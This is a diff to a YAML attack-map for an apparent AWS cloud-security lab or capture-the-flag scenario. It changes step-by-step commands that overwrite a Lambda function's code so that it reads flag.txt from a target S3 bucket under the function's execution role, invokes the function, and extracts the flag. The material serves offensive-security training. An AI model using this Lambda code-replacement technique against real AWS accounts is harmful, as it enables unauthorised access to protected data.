@@ -76,14 +76,16 @@ attackMap:
         - description: "Inspect the handler name from function configuration"
           command: "aws lambda get-function-configuration --function-name pl-prod-lambda-003-to-bucket-target-lambda --query 'Handler' --output text"
         - description: "Create the malicious payload (appended to original handler file)"
-          command: |
-            cat > /tmp/lambda_function.py << 'EOF'
+          command: |-
+            TARGET_BUCKET=<paste the target_bucket_name output here>
+            cat > /tmp/lambda_function.py << EOF
             import boto3
             import json
+            import os
 
             def lambda_handler(event, context):
                 s3 = boto3.client('s3')
-                bucket = event.get('bucket')
+                bucket = os.environ.get('TARGET_BUCKET', '${TARGET_BUCKET}')
                 response = s3.get_object(Bucket=bucket, Key='flag.txt')
                 flag = response['Body'].read().decode('utf-8')
                 return {'statusCode': 200, 'body': json.dumps({'flag': flag})}
@@ -95,15 +97,16 @@ attackMap:
       to: target-role
       label: "lambda:InvokeFunction"
       description: >
-        Invoke the updated Lambda function, passing the target bucket name in the payload.
-        The function executes under the Lambda execution role, which holds s3:GetObject on
-        the target bucket. The flag value is returned in the response body.
+        Invoke the updated Lambda function with an empty payload — the bucket was baked
+        into the handler at write time. The function executes under the Lambda execution
+        role, which holds s3:GetObject on the target bucket. The flag value is returned
+        in the response body.
       hints: []
       commands:
-        - description: "Discover the target bucket name"
-          command: "aws s3api list-buckets --query \"Buckets[?starts_with(Name, 'pl-prod-lambda-003-to-bucket-')].Name\" --output text"
-        - description: "Invoke the Lambda function with the bucket name in the payload"
-          command: "aws lambda invoke --function-name pl-prod-lambda-003-to-bucket-target-lambda --payload '{\"bucket\": \"pl-prod-lambda-003-to-bucket-{account_id}-{resource_suffix}\"}' /tmp/lambda-003-response.json && cat /tmp/lambda-003-response.json"
+        - description: "Capture the target bucket name from the player's Outputs tab"
+          command: "TARGET_BUCKET=<paste the target_bucket_name output here>"
+        - description: "Invoke the Lambda function with an empty payload"
+          command: "aws lambda invoke --function-name pl-prod-lambda-003-to-bucket-target-lambda --payload '{}' /tmp/lambda-003-response.json && cat /tmp/lambda-003-response.json"
 
     - from: target-role
       to: target-bucket
@@ -118,4 +121,4 @@ attackMap:
         - description: "Extract the flag value from the Lambda response"
           command: "cat /tmp/lambda-003-response.json | python3 -c \"import sys,json; body=json.load(sys.stdin); print(json.loads(body['body'])['flag'])\""
         - description: "Alternatively, retrieve the flag directly from S3 using the bucket access role (if accessible)"
-          command: "aws s3 cp s3://pl-prod-lambda-003-to-bucket-{account_id}-{resource_suffix}/flag.txt -"
+          command: "aws s3 cp s3://${TARGET_BUCKET}/flag.txt -"
